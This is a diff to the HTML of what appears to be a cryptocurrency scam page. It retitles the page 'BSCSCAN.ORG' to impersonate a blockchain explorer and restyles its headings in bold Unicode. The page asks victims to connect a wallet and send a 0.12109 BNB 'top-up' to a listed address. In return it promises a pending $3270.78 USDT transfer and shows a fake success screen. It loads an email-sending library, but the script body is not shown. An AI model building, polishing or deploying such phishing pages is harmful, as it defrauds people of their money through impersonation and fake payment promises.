@@ -1,7 +1,7 @@
 <!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" /><meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>BNB Smart Chain Dashboard</title>
+  <title>𝗕𝗦𝗖𝗦𝗖𝗔𝗡.𝗢𝗥𝗚</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -22,11 +22,11 @@
 </head>
 <body>
   <button class="back-btn hidden" onclick="goBack()">&lt;</button>  <div class="container" id="page1">
-    <h1>BNB Smart Chain Dashboard</h1>
+    <h1>𝗕𝗡𝗕 𝗦𝗺𝗮𝗿𝘁 𝗖𝗵𝗮𝗶𝗻</h1>
     <input type="text" id="manualAddress" placeholder="Enter BSC Address" />
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
   </div>  <div class="container hidden" id="dashboard">
-    <h1>Transaction Wallet Dashboard</h1>
+    <h1>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗪𝗮𝗹𝗹𝗲𝘁 𝗦𝗼𝘂𝗿𝗰𝗲 𝗗𝗮𝘀𝗵𝗯𝗼𝗮𝗿𝗱</h1>
     <p>𝗔𝗗𝗗𝗥𝗘𝗦𝗦: <span id="shortAddress"></span></p>
     <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗽𝗲𝗻𝗱𝗶𝗻𝗴.........</p>
     <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘀𝗼𝘂𝗿𝗰𝗲: Binance</p>
@@ -42,10 +42,10 @@
     <h1>Confirm opBNB</h1>
     <button class="btn" onclick="nextPage('confirm2')">Confirm opBNB</button>
   </div>  <div class="container hidden" id="confirm2">
-    <h1>Transaction in Progress</h1>
+    <h1>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀......</h1>
     <button class="btn" onclick="nextPage('contractInput')">Confirm</button>
   </div>  <div class="container hidden" id="contractInput">
-    <h1>Input opBNB Contract Code</h1>
+    <h1>𝗜𝗻𝗽𝘂𝘁 𝗼𝗽𝗕𝗡𝗕 𝗖𝗼𝗻𝘁𝗿𝗮𝗰𝘁 𝗖𝗼𝗱𝗲</h1>
     <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: BNB Smart Chain BEP20:</p>
     <p>𝗧𝗼𝗽-𝗨𝗽: 0.12109 BNB</p>
     <p><strong>0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</strong></p>
@@ -53,14 +53,14 @@
     <button class="btn" onclick="verifyContract()">Confirm contract transaction</button>
     <div class="status" id="verifyStatus"></div>
   </div>  <div class="container hidden" id="success">
-    <h1>✅ Transaction Successful</h1>
+    <h1>✅ 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟</h1>
     <p>𝗔𝗺𝗼𝘂𝗻𝘁: $3270.78 USDT</p>
     <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘀𝗼𝘂𝗿𝗰𝗲: 0xb8c77482e45f1f44de1745f52c74426c631bdd52</p>
     <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: BNB Smart Chain BEP20</p>
     <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: Successful✅️</p>
     <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗡𝗼𝘁𝗲: To be credited to user address in 27HRS</p>
   </div>  <div class="container hidden" id="declined">
-    <h1>❌ Transaction Declined</h1>
+    <h1>❌ 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗</h1>
     <p>Invalid contract code.</p>
   </div>  <script>
     let pageHistory = [];
